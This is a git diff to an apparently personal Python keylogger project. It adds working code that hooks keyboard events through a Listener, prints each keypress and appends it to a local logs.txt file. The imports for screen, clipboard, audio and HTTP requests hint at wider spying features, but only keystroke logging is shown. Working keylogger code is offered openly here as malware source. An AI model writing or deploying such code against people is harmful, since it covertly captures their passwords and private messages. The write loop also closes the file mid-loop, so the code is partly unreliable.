@@ -10,7 +10,6 @@ from PIL import ImageGrab
 
 # Modules to collect Clipboard
 #import win32clipboard
-#import pyperclip
 import clipboard
 
 
@@ -40,6 +39,67 @@ from requests import get
 from scipy.io.wavfile import write
 import sounddevice as soundDeviceObject
 
+# Will come back to this
+keysInformation = "logs.txt"
+filePath = "/Users/kayvee/Code/KeyLogger/PythonKeyLogger"
+
+totalKeys = 0
+keys =[]
 
 
-print("Dependicies Running Properly.. Yayyy!")
+
+
+def key_is_pressed(Key):
+	global totalKeys,keys
+
+	print(Key)
+	keys.append(Key)
+	totalKeys += 1
+	
+	if totalKeys >= 1:
+		totalKeys = 0
+		write_keys_on_file(keys)
+		keys=[]
+
+
+def write_keys_on_file(keys):
+	with open(filePath + "/"+keysInformation,"a") as f:
+		for key in keys:
+			k = str(key).replace("'","")
+			if k.find("space") > 0:
+				f.write("\n")
+				f.close()
+			elif k.find("Key") == -1:
+				f.write(k)
+				f.close()
+
+
+
+def key_is_released(key):
+	if key == Key.esc:
+		return False
+
+
+with Listener(on_press = key_is_pressed, on_release = key_is_released) as listener:
+	listener.join()
+
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
